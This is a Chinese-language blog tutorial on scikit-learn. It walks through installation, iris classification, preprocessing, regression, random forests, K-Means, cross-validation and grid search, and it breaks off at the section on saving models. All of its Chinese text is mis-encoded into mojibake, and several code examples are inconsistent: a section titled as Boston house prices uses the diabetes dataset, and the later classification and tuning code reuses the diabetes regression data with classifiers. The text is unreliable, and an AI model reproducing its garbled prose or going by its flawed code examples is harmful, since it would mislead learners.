                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Scikit-learnï¼ˆç®€ç§° sklearnï¼‰æ˜¯ Python æœºå™¨å­¦ä¹ é¢†åŸŸçš„ç»å…¸åº“ï¼Œå°è£…äº†åˆ†ç±»ã€å›å½’ã€èšç±»ã€ç‰¹å¾å·¥ç¨‹ç­‰å…¨å¥—æœºå™¨å­¦ä¹ å·¥å…·ï¼Œä¸Šæ‰‹ç®€å•ã€æ–‡æ¡£å®Œå–„ï¼Œæ˜¯æ–°æ‰‹å…¥é—¨æœºå™¨å­¦ä¹ çš„é¦–é€‰ã€‚æœ¬æ–‡ä»å®æˆ˜è§’åº¦æ‹†è§£ Scikit-learn æ ¸å¿ƒç”¨æ³•ï¼Œæ‰€æœ‰ç¤ºä¾‹å‡å¯ç›´æ¥è¿è¡Œï¼Œå¸®ä½ å¿«é€Ÿæ­å»ºç¬¬ä¸€ä¸ªæœºå™¨å­¦ä¹ æ¨¡å‹ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€Scikit-learn å®‰è£…ä¸ç¯å¢ƒå‡†å¤‡</h2>
<h3 data-id="heading-1">1. å®‰è£…æ–¹å¼</h3>
<p>Scikit-learn ä¾èµ– NumPyã€Pandasã€SciPy ç­‰åº“ï¼Œå»ºè®®å…ˆå®‰è£…è¿™äº›åŸºç¡€åº“ï¼Œå†å®‰è£… sklearnï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£…åŸºç¡€ä¾èµ–</span>
pip install numpy pandas scipy -i https://pypi.tuna.tsinghua.edu.cn/simple
<span class="hljs-comment"># å®‰è£… scikit-learnï¼ˆå›½å†…æºåŠ é€Ÿï¼‰</span>
pip install scikit-learn -i https://pypi.tuna.tsinghua.edu.cn/simple
</code></pre>
<p>éªŒè¯å®‰è£…æˆåŠŸï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> sklearn
<span class="hljs-built_in">print</span>(<span class="hljs-string">"Scikit-learn ç‰ˆæœ¬ï¼š"</span>, sklearn.__version__)  <span class="hljs-comment"># è¾“å‡ºç‰ˆæœ¬å·ï¼ˆæ¨è1.2+ï¼‰</span>
</code></pre>
<h3 data-id="heading-2">2. æ ¸å¿ƒæ¨¡å—è¯´æ˜</h3>
<p>Scikit-learn æŒ‰åŠŸèƒ½åˆ’åˆ†æ¨¡å—ï¼Œæ–°æ‰‹é‡ç‚¹æŒæ¡ä»¥ä¸‹æ ¸å¿ƒæ¨¡å—ï¼š</p>
<ul>
<li><code>sklearn.datasets</code>ï¼šå†…ç½®æ•°æ®é›†ï¼ˆç”¨äºç»ƒä¹ ï¼‰ï¼›</li>
<li><code>sklearn.model_selection</code>ï¼šæ•°æ®åˆ’åˆ†ã€æ¨¡å‹è¯„ä¼°ï¼ˆå¦‚è®­ç»ƒé›†/æµ‹è¯•é›†æ‹†åˆ†ï¼‰ï¼›</li>
<li><code>sklearn.preprocessing</code>ï¼šæ•°æ®é¢„å¤„ç†ï¼ˆç‰¹å¾æ ‡å‡†åŒ–ã€ç¼–ç ç­‰ï¼‰ï¼›</li>
<li><code>sklearn.linear_model</code>ï¼šçº¿æ€§æ¨¡å‹ï¼ˆå¦‚çº¿æ€§å›å½’ã€é€»è¾‘å›å½’ï¼‰ï¼›</li>
<li><code>sklearn.tree</code>/<code>sklearn.ensemble</code>ï¼šæ ‘æ¨¡å‹ã€é›†æˆæ¨¡å‹ï¼ˆå¦‚éšæœºæ£®æ—ï¼‰ï¼›</li>
<li><code>sklearn.metrics</code>ï¼šæ¨¡å‹è¯„ä¼°æŒ‡æ ‡ï¼ˆå¦‚å‡†ç¡®ç‡ã€å‡æ–¹è¯¯å·®ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-3">äºŒã€Scikit-learn æ ¸å¿ƒæµç¨‹ï¼ˆäº”æ­¥èµ°ï¼‰</h2>
<p>Scikit-learn æ‰€æœ‰æ¨¡å‹çš„ä½¿ç”¨æµç¨‹é«˜åº¦ç»Ÿä¸€ï¼Œæ ¸å¿ƒå¯æ€»ç»“ä¸ºâ€œäº”æ­¥èµ°â€ï¼š</p>
<ol>
<li>å‡†å¤‡æ•°æ®ï¼ˆåŠ è½½/é¢„å¤„ç†ï¼‰ï¼›</li>
<li>åˆ’åˆ†è®­ç»ƒé›†å’Œæµ‹è¯•é›†ï¼›</li>
<li>é€‰æ‹©æ¨¡å‹å¹¶åˆå§‹åŒ–ï¼›</li>
<li>æ¨¡å‹è®­ç»ƒï¼ˆæ‹Ÿåˆæ•°æ®ï¼‰ï¼›</li>
<li>æ¨¡å‹é¢„æµ‹ä¸è¯„ä¼°ã€‚</li>
</ol>
<p>ä¸‹é¢ä»¥â€œé¸¢å°¾èŠ±åˆ†ç±»â€ï¼ˆç»å…¸å…¥é—¨æ¡ˆä¾‹ï¼‰ä¸ºä¾‹ï¼Œå®Œæ•´æ¼”ç¤ºæ•´ä¸ªæµç¨‹ã€‚</p>
<h3 data-id="heading-4">ç¤ºä¾‹ï¼šé¸¢å°¾èŠ±åˆ†ç±»ï¼ˆç›‘ç£å­¦ä¹ -åˆ†ç±»ï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ç¬¬ä¸€æ­¥ï¼šåŠ è½½æ•°æ®å¹¶æŸ¥çœ‹åŸºæœ¬ä¿¡æ¯</span>
<span class="hljs-keyword">from</span> sklearn.datasets <span class="hljs-keyword">import</span> load_iris
<span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd

<span class="hljs-comment"># åŠ è½½å†…ç½®é¸¢å°¾èŠ±æ•°æ®é›†</span>
iris = load_iris()
<span class="hljs-comment"># è½¬ä¸º DataFrame æ–¹ä¾¿æŸ¥çœ‹ï¼ˆæ–°æ‰‹å‹å¥½ï¼‰</span>
df = pd.DataFrame(iris.data, columns=iris.feature_names)
df[<span class="hljs-string">"ç±»åˆ«"</span>] = iris.target  <span class="hljs-comment"># æ ‡ç­¾åˆ—ï¼ˆ0/1/2 å¯¹åº”ä¸‰ç§é¸¢å°¾èŠ±ï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ•°æ®é›†å‰5è¡Œï¼š"</span>)
<span class="hljs-built_in">print</span>(df.head())
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\næ•°æ®é›†åŸºæœ¬ä¿¡æ¯ï¼š"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç‰¹å¾æ•°é‡ï¼š<span class="hljs-subst">{iris.data.shape[<span class="hljs-number">1</span>]}</span>ï¼Œæ ·æœ¬æ•°é‡ï¼š<span class="hljs-subst">{iris.data.shape[<span class="hljs-number">0</span>]}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç±»åˆ«ï¼š<span class="hljs-subst">{iris.target_names}</span>"</span>)

<span class="hljs-comment"># ç¬¬äºŒæ­¥ï¼šåˆ’åˆ†è®­ç»ƒé›†å’Œæµ‹è¯•é›†ï¼ˆæ ¸å¿ƒï¼é¿å…è¿‡æ‹Ÿåˆï¼‰</span>
<span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split

<span class="hljs-comment"># ç‰¹å¾å˜é‡ Xï¼Œç›®æ ‡å˜é‡ y</span>
X = iris.data
y = iris.target
<span class="hljs-comment"># æ‹†åˆ†ï¼š70% è®­ç»ƒé›†ï¼Œ30% æµ‹è¯•é›†ï¼Œéšæœºç§å­å›ºå®šï¼ˆä¿è¯ç»“æœå¯å¤ç°ï¼‰</span>
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=<span class="hljs-number">0.3</span>, random_state=<span class="hljs-number">42</span>, stratify=y  <span class="hljs-comment"># stratify ä¿è¯ç±»åˆ«åˆ†å¸ƒå‡åŒ€</span>
)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"\nè®­ç»ƒé›†æ ·æœ¬æ•°ï¼š<span class="hljs-subst">{X_train.shape[<span class="hljs-number">0</span>]}</span>ï¼Œæµ‹è¯•é›†æ ·æœ¬æ•°ï¼š<span class="hljs-subst">{X_test.shape[<span class="hljs-number">0</span>]}</span>"</span>)

<span class="hljs-comment"># ç¬¬ä¸‰æ­¥ï¼šé€‰æ‹©æ¨¡å‹å¹¶åˆå§‹åŒ–ï¼ˆä»¥é€»è¾‘å›å½’ä¸ºä¾‹ï¼‰</span>
<span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LogisticRegression

<span class="hljs-comment"># åˆå§‹åŒ–æ¨¡å‹ï¼ˆè®¾ç½®éšæœºç§å­ä¿è¯ç»“æœç¨³å®šï¼‰</span>
model = LogisticRegression(random_state=<span class="hljs-number">42</span>, max_iter=<span class="hljs-number">200</span>)  <span class="hljs-comment"># max_iter å¢åŠ è¿­ä»£æ¬¡æ•°é¿å…æ”¶æ•›è­¦å‘Š</span>

<span class="hljs-comment"># ç¬¬å››æ­¥ï¼šæ¨¡å‹è®­ç»ƒï¼ˆæ‹Ÿåˆè®­ç»ƒé›†æ•°æ®ï¼‰</span>
model.fit(X_train, y_train)

<span class="hljs-comment"># ç¬¬äº”æ­¥ï¼šæ¨¡å‹é¢„æµ‹ä¸è¯„ä¼°</span>
<span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> accuracy_score, classification_report

<span class="hljs-comment"># é¢„æµ‹æµ‹è¯•é›†</span>
y_pred = model.predict(X_test)
<span class="hljs-comment"># è®¡ç®—å‡†ç¡®ç‡ï¼ˆåˆ†ç±»ä»»åŠ¡æ ¸å¿ƒæŒ‡æ ‡ï¼‰</span>
accuracy = accuracy_score(y_test, y_pred)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"\næ¨¡å‹æµ‹è¯•é›†å‡†ç¡®ç‡ï¼š<span class="hljs-subst">{accuracy:<span class="hljs-number">.2</span>f}</span>"</span>)
<span class="hljs-comment"># è¯¦ç»†è¯„ä¼°æŠ¥å‘Šï¼ˆç²¾ç¡®ç‡ã€å¬å›ç‡ã€F1å€¼ï¼‰</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\nåˆ†ç±»æŠ¥å‘Šï¼š"</span>)
<span class="hljs-built_in">print</span>(classification_report(y_test, y_pred, target_names=iris.target_names))
</code></pre>
<p><strong>è¾“å‡ºç»“æœï¼ˆå…³é”®éƒ¨åˆ†ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">æ¨¡å‹æµ‹è¯•é›†å‡†ç¡®ç‡ï¼š0.98
åˆ†ç±»æŠ¥å‘Šï¼š
<span class="hljs-code">              precision    recall  f1-score   support
</span>
<span class="hljs-code">      setosa       1.00      1.00      1.00        15
  versicolor       0.94      1.00      0.97        15
   virginica       1.00      0.93      0.97        15
</span>
<span class="hljs-code">    accuracy                           0.98        45
   macro avg       0.98      0.98      0.98        45
weighted avg       0.98      0.98      0.98        45
</span></code></pre>
<h2 data-id="heading-5">ä¸‰ã€æ•°æ®é¢„å¤„ç†ï¼ˆæœºå™¨å­¦ä¹ ç¬¬ä¸€æ­¥ï¼‰</h2>
<p>åŸå§‹æ•°æ®å¾€å¾€æ— æ³•ç›´æ¥è¾“å…¥æ¨¡å‹ï¼Œé¢„å¤„ç†æ˜¯æå‡æ¨¡å‹æ•ˆæœçš„å…³é”®ï¼ŒScikit-learn æä¾›äº†ä¸€ç«™å¼é¢„å¤„ç†å·¥å…·ã€‚</p>
<h3 data-id="heading-6">1. ç‰¹å¾æ ‡å‡†åŒ–/å½’ä¸€åŒ–</h3>
<p>æ•°å€¼ç‰¹å¾çš„é‡çº²å·®å¼‚ï¼ˆå¦‚èº«é«˜180cmã€ä½“é‡70kgï¼‰ä¼šå½±å“çº¿æ€§æ¨¡å‹æ•ˆæœï¼Œéœ€ç»Ÿä¸€é‡çº²ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.preprocessing <span class="hljs-keyword">import</span> StandardScaler, MinMaxScaler

<span class="hljs-comment"># 1. æ ‡å‡†åŒ–ï¼ˆå‡å€¼0ï¼Œæ–¹å·®1ï¼Œæœ€å¸¸ç”¨ï¼‰</span>
scaler = StandardScaler()
X_train_scaled = scaler.fit_transform(X_train)  <span class="hljs-comment"># è®­ç»ƒé›†æ‹Ÿåˆ+è½¬æ¢</span>
X_test_scaled = scaler.transform(X_test)        <span class="hljs-comment"># æµ‹è¯•é›†ä»…è½¬æ¢ï¼ˆé¿å…æ•°æ®æ³„éœ²ï¼‰</span>

<span class="hljs-comment"># 2. å½’ä¸€åŒ–ï¼ˆç¼©æ”¾åˆ°0-1ä¹‹é—´ï¼‰</span>
minmax_scaler = MinMaxScaler()
X_train_minmax = minmax_scaler.fit_transform(X_train)
</code></pre>
<h3 data-id="heading-7">2. ç±»åˆ«ç‰¹å¾ç¼–ç </h3>
<p>å­—ç¬¦ä¸²ç±»å‹çš„ç±»åˆ«ç‰¹å¾ï¼ˆå¦‚â€œç”·/å¥³â€â€œåŒ—äº¬/ä¸Šæµ·â€ï¼‰éœ€è½¬ä¸ºæ•°å€¼ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.preprocessing <span class="hljs-keyword">import</span> LabelEncoder, OneHotEncoder
<span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd

<span class="hljs-comment"># ç¤ºä¾‹æ•°æ®</span>
data = pd.DataFrame({
    <span class="hljs-string">"æ€§åˆ«"</span>: [<span class="hljs-string">"ç”·"</span>, <span class="hljs-string">"å¥³"</span>, <span class="hljs-string">"ç”·"</span>, <span class="hljs-string">"å¥³"</span>],
    <span class="hljs-string">"åŸå¸‚"</span>: [<span class="hljs-string">"åŒ—äº¬"</span>, <span class="hljs-string">"ä¸Šæµ·"</span>, <span class="hljs-string">"å¹¿å·"</span>, <span class="hljs-string">"åŒ—äº¬"</span>]
})

<span class="hljs-comment"># 1. æ ‡ç­¾ç¼–ç ï¼ˆé€‚ç”¨äºæœ‰åºç±»åˆ«ï¼Œå¦‚â€œä½/ä¸­/é«˜â€ï¼‰</span>
le = LabelEncoder()
data[<span class="hljs-string">"æ€§åˆ«_ç¼–ç "</span>] = le.fit_transform(data[<span class="hljs-string">"æ€§åˆ«"</span>])  <span class="hljs-comment"># ç”·=1ï¼Œå¥³=0</span>

<span class="hljs-comment"># 2. ç‹¬çƒ­ç¼–ç ï¼ˆé€‚ç”¨äºæ— åºç±»åˆ«ï¼Œå¦‚â€œåŒ—äº¬/ä¸Šæµ·/å¹¿å·â€ï¼‰</span>
ohe = OneHotEncoder(sparse_output=<span class="hljs-literal">False</span>, drop=<span class="hljs-string">"first"</span>)  <span class="hljs-comment"># drop=first é¿å…å¤šé‡å…±çº¿æ€§</span>
city_encoded = ohe.fit_transform(data[[<span class="hljs-string">"åŸå¸‚"</span>]])
<span class="hljs-comment"># è½¬ä¸º DataFrame æ–¹ä¾¿æŸ¥çœ‹</span>
city_df = pd.DataFrame(city_encoded, columns=ohe.get_feature_names_out([<span class="hljs-string">"åŸå¸‚"</span>]))
data = pd.concat([data, city_df], axis=<span class="hljs-number">1</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ç¼–ç åæ•°æ®ï¼š"</span>)
<span class="hljs-built_in">print</span>(data)
</code></pre>
<h3 data-id="heading-8">3. å¤„ç†ç¼ºå¤±å€¼</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.impute <span class="hljs-keyword">import</span> SimpleImputer

<span class="hljs-comment"># å‡å€¼å¡«å……æ•°å€¼å‹ç¼ºå¤±å€¼</span>
imputer = SimpleImputer(strategy=<span class="hljs-string">"mean"</span>)  <span class="hljs-comment"># å¯é€‰ï¼šmedianï¼ˆä¸­ä½æ•°ï¼‰ã€most_frequentï¼ˆä¼—æ•°ï¼‰</span>
X_train_imputed = imputer.fit_transform(X_train)
</code></pre>
<h2 data-id="heading-9">å››ã€å¸¸ç”¨æœºå™¨å­¦ä¹ æ¨¡å‹å®æˆ˜</h2>
<p>Scikit-learn å°è£…äº†ä¸»æµæœºå™¨å­¦ä¹ æ¨¡å‹ï¼Œè°ƒç”¨æ–¹å¼é«˜åº¦ç»Ÿä¸€ï¼Œä»…éœ€æ›¿æ¢æ¨¡å‹ç±»å³å¯ã€‚</p>
<h3 data-id="heading-10">1. å›å½’æ¨¡å‹ï¼ˆé¢„æµ‹è¿ç»­å€¼ï¼Œå¦‚æˆ¿ä»·ã€é”€é‡ï¼‰</h3>
<p>ä»¥æ³¢å£«é¡¿æˆ¿ä»·é¢„æµ‹ï¼ˆå›å½’ä»»åŠ¡ï¼‰ä¸ºä¾‹ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.datasets <span class="hljs-keyword">import</span> load_diabetes  <span class="hljs-comment"># ç³–å°¿ç—…æ•°æ®é›†ï¼ˆå›å½’ï¼‰</span>
<span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LinearRegression
<span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> mean_squared_error, r2_score

<span class="hljs-comment"># åŠ è½½æ•°æ®</span>
diabetes = load_diabetes()
X, y = diabetes.data, diabetes.target

<span class="hljs-comment"># åˆ’åˆ†æ•°æ®é›†</span>
X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="hljs-number">0.3</span>, random_state=<span class="hljs-number">42</span>)

<span class="hljs-comment"># è®­ç»ƒçº¿æ€§å›å½’æ¨¡å‹</span>
lr = LinearRegression()
lr.fit(X_train, y_train)

<span class="hljs-comment"># é¢„æµ‹ä¸è¯„ä¼°</span>
y_pred = lr.predict(X_test)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å‡æ–¹è¯¯å·®ï¼ˆMSEï¼‰ï¼š<span class="hljs-subst">{mean_squared_error(y_test, y_pred):<span class="hljs-number">.2</span>f}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å†³å®šç³»æ•°ï¼ˆRÂ²ï¼‰ï¼š<span class="hljs-subst">{r2_score(y_test, y_pred):<span class="hljs-number">.2</span>f}</span>"</span>)  <span class="hljs-comment"># RÂ²è¶Šæ¥è¿‘1è¶Šå¥½</span>
</code></pre>
<h3 data-id="heading-11">2. åˆ†ç±»æ¨¡å‹ï¼ˆé¢„æµ‹ç±»åˆ«ï¼Œå¦‚æ˜¯å¦æ‚£ç—…ã€å®¢æˆ·æµå¤±ï¼‰</h3>
<p>é™¤äº†é€»è¾‘å›å½’ï¼Œå¸¸ç”¨çš„è¿˜æœ‰å†³ç­–æ ‘ã€éšæœºæ£®æ—ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.tree <span class="hljs-keyword">import</span> DecisionTreeClassifier
<span class="hljs-keyword">from</span> sklearn.ensemble <span class="hljs-keyword">import</span> RandomForestClassifier

<span class="hljs-comment"># 1. å†³ç­–æ ‘</span>
dt = DecisionTreeClassifier(max_depth=<span class="hljs-number">3</span>, random_state=<span class="hljs-number">42</span>)  <span class="hljs-comment"># é™åˆ¶æ ‘æ·±åº¦é¿å…è¿‡æ‹Ÿåˆ</span>
dt.fit(X_train, y_train)
dt_accuracy = accuracy_score(y_test, dt.predict(X_test))
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å†³ç­–æ ‘å‡†ç¡®ç‡ï¼š<span class="hljs-subst">{dt_accuracy:<span class="hljs-number">.2</span>f}</span>"</span>)

<span class="hljs-comment"># 2. éšæœºæ£®æ—ï¼ˆé›†æˆæ¨¡å‹ï¼Œæ•ˆæœæ›´ä¼˜ï¼‰</span>
rf = RandomForestClassifier(n_estimators=<span class="hljs-number">100</span>, random_state=<span class="hljs-number">42</span>)  <span class="hljs-comment"># 100æ£µæ ‘</span>
rf.fit(X_train, y_train)
rf_accuracy = accuracy_score(y_test, rf.predict(X_test))
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"éšæœºæ£®æ—å‡†ç¡®ç‡ï¼š<span class="hljs-subst">{rf_accuracy:<span class="hljs-number">.2</span>f}</span>"</span>)
</code></pre>
<h3 data-id="heading-12">3. æ— ç›‘ç£å­¦ä¹ ï¼ˆèšç±»ï¼Œæ— æ ‡ç­¾æ•°æ®ï¼‰</h3>
<p>ä»¥ K-Means èšç±»ä¸ºä¾‹ï¼ˆé¸¢å°¾èŠ±æ•°æ®é›†æ— æ ‡ç­¾èšç±»ï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.cluster <span class="hljs-keyword">import</span> KMeans
<span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt

<span class="hljs-comment"># åˆå§‹åŒ–K-Meansï¼ˆæŒ‡å®šèšç±»æ•°ä¸º3ï¼Œå¯¹åº”é¸¢å°¾èŠ±3ä¸ªç±»åˆ«ï¼‰</span>
kmeans = KMeans(n_clusters=<span class="hljs-number">3</span>, random_state=<span class="hljs-number">42</span>)
cluster_labels = kmeans.fit_predict(iris.data)

<span class="hljs-comment"># å¯è§†åŒ–èšç±»ç»“æœï¼ˆå–å‰ä¸¤ä¸ªç‰¹å¾ï¼‰</span>
plt.scatter(iris.data[:, <span class="hljs-number">0</span>], iris.data[:, <span class="hljs-number">1</span>], c=cluster_labels, cmap=<span class="hljs-string">"viridis"</span>)
plt.scatter(kmeans.cluster_centers_[:, <span class="hljs-number">0</span>], kmeans.cluster_centers_[:, <span class="hljs-number">1</span>], marker=<span class="hljs-string">"*"</span>, s=<span class="hljs-number">200</span>, c=<span class="hljs-string">"red"</span>)
plt.xlabel(iris.feature_names[<span class="hljs-number">0</span>])
plt.ylabel(iris.feature_names[<span class="hljs-number">1</span>])
plt.title(<span class="hljs-string">"K-Means èšç±»ç»“æœ"</span>)
plt.show()
</code></pre>
<h2 data-id="heading-13">äº”ã€æ¨¡å‹è¯„ä¼°ä¸è°ƒä¼˜</h2>
<h3 data-id="heading-14">1. äº¤å‰éªŒè¯ï¼ˆæ›´å¯é çš„æ¨¡å‹è¯„ä¼°ï¼‰</h3>
<p>å•æ¬¡è®­ç»ƒ/æµ‹è¯•é›†æ‹†åˆ†ç»“æœæœ‰å¶ç„¶æ€§ï¼Œäº¤å‰éªŒè¯å¯ç»¼åˆè¯„ä¼°æ¨¡å‹ç¨³å®šæ€§ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> cross_val_score

<span class="hljs-comment"># 5æŠ˜äº¤å‰éªŒè¯</span>
scores = cross_val_score(rf, X, y, cv=<span class="hljs-number">5</span>, scoring=<span class="hljs-string">"accuracy"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"5æŠ˜äº¤å‰éªŒè¯å‡†ç¡®ç‡ï¼š<span class="hljs-subst">{scores.mean():<span class="hljs-number">.2</span>f}</span> Â± <span class="hljs-subst">{scores.std():<span class="hljs-number">.2</span>f}</span>"</span>)
</code></pre>
<h3 data-id="heading-15">2. è¶…å‚æ•°è°ƒä¼˜ï¼ˆæå‡æ¨¡å‹æ•ˆæœï¼‰</h3>
<p>é€šè¿‡ç½‘æ ¼æœç´¢è‡ªåŠ¨å¯»æ‰¾æœ€ä¼˜è¶…å‚æ•°ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> GridSearchCV

<span class="hljs-comment"># å®šä¹‰å‚æ•°ç½‘æ ¼</span>
param_grid = {
    <span class="hljs-string">"n_estimators"</span>: [<span class="hljs-number">50</span>, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>],  <span class="hljs-comment"># æ ‘çš„æ•°é‡</span>
    <span class="hljs-string">"max_depth"</span>: [<span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-literal">None</span>]        <span class="hljs-comment"># æ ‘çš„æœ€å¤§æ·±åº¦</span>
}

<span class="hljs-comment"># ç½‘æ ¼æœç´¢ï¼ˆ5æŠ˜äº¤å‰éªŒè¯ï¼‰</span>
grid_search = GridSearchCV(
    estimator=RandomForestClassifier(random_state=<span class="hljs-number">42</span>),
    param_grid=param_grid,
    cv=<span class="hljs-number">5</span>,
    scoring=<span class="hljs-string">"accuracy"</span>
)
grid_search.fit(X_train, y_train)

<span class="hljs-comment"># æœ€ä¼˜å‚æ•°å’Œå¾—åˆ†</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"æœ€ä¼˜å‚æ•°ï¼š<span class="hljs-subst">{grid_search.best_params_}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"æœ€ä¼˜äº¤å‰éªŒè¯å¾—åˆ†ï¼š<span class="hljs-subst">{grid_search.best_score_:<span class="hljs-number">.2</span>f}</span>"</span>)

<span class="hljs-comment"># ä½¿ç”¨æœ€ä¼˜æ¨¡å‹é¢„æµ‹</span>
best_model = grid_search.best_estimator_
final_accuracy = accuracy_score(y_test, best_model.predict(X_test))
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"æœ€ä¼˜æ¨¡å‹æµ‹è¯•é›†å‡†ç¡®ç‡ï¼š<span class="hljs-subst">{final_accuracy:<span class="hljs-number">.2</span>f}</span>"</span>)
</code></pre>
<h2 data-id="heading-16">å…­ã€æ¨¡å‹ä¿å­˜ä¸åŠ è½½</h2>
